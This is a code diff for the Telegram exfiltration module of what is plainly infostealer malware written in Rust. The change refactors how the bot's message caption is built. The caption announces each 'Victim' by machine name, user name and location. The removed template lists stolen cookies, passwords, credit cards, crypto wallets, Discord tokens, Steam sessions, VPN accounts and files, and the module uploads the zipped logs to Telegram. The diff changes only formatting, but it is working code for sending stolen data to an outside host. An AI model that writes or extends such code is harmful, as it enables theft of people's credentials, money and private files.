@@ -1,10 +1,10 @@
 use crate::{ExternalLink, LogContent, LogFile, LogSender, SendError};
-use alloc::fmt::format;
 use alloc::string::{String, ToString};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
 use alloc::{format, vec};
-use collector::{Browser, Collector, Device, DisplayCollector, EmojiBoolean, FileGrabber, Software, Vpn};
+use collector::display::{CollectorBlock, CollectorDisplay};
+use collector::{Collector, Device};
 use core::fmt::{Display, Error, Formatter};
 use derive_new::new;
 use indoc::formatdoc;
@@ -35,6 +35,26 @@ pub struct TelegramBotSender {
     token: Arc<str>,
 }
 
+struct TelegramBlockDisplay<'a>(&'a CollectorBlock);
+
+impl Display for TelegramBlockDisplay<'_> {
+    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
+        writeln!(f, "{} <b>{}</b>", self.0.emoji, self.0.name)?;
+
+        let len = self.0.fields.len();
+        for (i, field) in self.0.fields.iter().enumerate() {
+            let prefix = if i == len - 1 { "└─" } else { "├─" };
+            writeln!(
+                f,
+                "<code>{}</code> {} {}: <code>{}</code>",
+                prefix, field.emoji, field.name, field.value
+            )?;
+        }
+
+        Ok(())
+    }
+}
+
 fn generate_caption<P, C>(
     log_content: &LogContent,
     password: Option<P>,
@@ -44,67 +64,26 @@ where
     P: AsRef<str>,
     C: Collector,
 {
-    let PcInfo { computer_name, user_name, product_name } = PcInfo::retrieve();
+    let PcInfo {
+        computer_name,
+        user_name,
+        product_name,
+    } = PcInfo::retrieve();
     let IpInfo { country, city, .. } = unwrapped_ip_info();
 
     let caption = formatdoc! {r#"
             ✨ New log from {country_flag} <code>{city}</code>
             Victim: <code>{computer_name}</code>/<code>{user_name}</code> on <code>{product_name}</code>
 
-            🔍 <b>Browser Data</b>
-            {first} 🍪 Cookies: <code>{cookies}</code>
-            {midd_} 🔐 Passwords: <code>{passwords}</code>
-            {midd_} 💳 Credit Cards: <code>{credit_cards}</code>
-            {midd_} ✍️ Autofills: <code>{auto_fills}</code>
-            {midd_} 🕘 History: <code>{history}</code>
-            {midd_} 📑 Bookmarks: <code>{bookmarks}</code>
-            {last_} ⬇️ Downloads: <code>{downloads}</code>
-
-            💻 <b>Installed Software</b>
-            {first} 👛 Wallets: <code>{wallets}</code>
-            {midd_} 📁 FTP Hosts: <code>{ftp_hosts}</code>
-            {midd_} 📲 Telegram: <code>{telegram}</code>
-            {midd_} 🎮 Discord Tokens: <code>{discord_tokens}</code>
-            {last_} 🕹️ Steam Sessions: <code>{steam_sessions}</code>
-
-            📂 <b>User Files</b>
-            {first} 🧑‍💻 Source Code: <code>{source_code}</code>
-            {midd_} 🗃️ Databases: <code>{databases}</code>
-            {last_} 📄 Documents: <code>{documents}</code>
-
-            🌐 <b>VPN Accounts</b>
-            {last_} 🔐 VPN Accounts: <code>{vpn_accounts}</code>
-
-            📶 <b>Device Data</b>
-            {last_} 📡 Wi-Fi Networks: <code>{wifi_networks}</code>
+            {collector}
         "#,
-        first = "<code>├─</code>",
-        last_ = "<code>└─</code>",
-        midd_ = "<code>├─</code>",
-
         country_flag = internal_code_to_flag(&country).map(Arc::from).unwrap_or(country.clone()),
-
-        cookies = collector.get_browser().get_cookies(),
-        passwords = collector.get_browser().get_passwords(),
-        credit_cards = collector.get_browser().get_credit_cards(),
-        auto_fills = collector.get_browser().get_auto_fills(),
-        history = collector.get_browser().get_history(),
-        bookmarks = collector.get_browser().get_bookmarks(),
-        downloads = collector.get_browser().get_downloads(),
-
-        wallets = collector.get_software().get_wallets(),
-        ftp_hosts = collector.get_software().get_ftp_hosts(),
-        telegram = EmojiBoolean(collector.get_software().is_telegram()),
-        discord_tokens = collector.get_software().get_discord_tokens(),
-        steam_sessions = collector.get_software().get_steam_session(),
-
-        source_code = collector.get_file_grabber().get_source_code_files(),
-        databases = collector.get_file_grabber().get_database_files(),
-        documents = collector.get_file_grabber().get_documents(),
-
-        vpn_accounts = collector.get_vpn().get_accounts(),
-
-        wifi_networks = collector.get_device().get_wifi_networks()
+        collector = collector.display_blocks()
+            .iter()
+            .map(TelegramBlockDisplay)
+            .map(|x| x.to_string())
+            .collect::<Vec<_>>()
+            .join("\n")
     };
 
     let link = match log_content {
@@ -334,10 +313,10 @@ impl LogSender for TelegramBotSender {
         P: AsRef<str> + Clone,
         C: Collector,
     {
-        if let LogContent::ZipArchive(archive) = &log_file.content {
-            if archive.len() >= TELEGRAM_MAX_FILE_SIZE {
-                return Err(SendError::LogFileTooBig);
-            }
+        if let LogContent::ZipArchive(archive) = &log_file.content
+            && archive.len() >= TELEGRAM_MAX_FILE_SIZE
+        {
+            return Err(SendError::LogFileTooBig);
         }
 
         let (caption, thumbnail) = generate_caption(&log_file.content, password, collector);
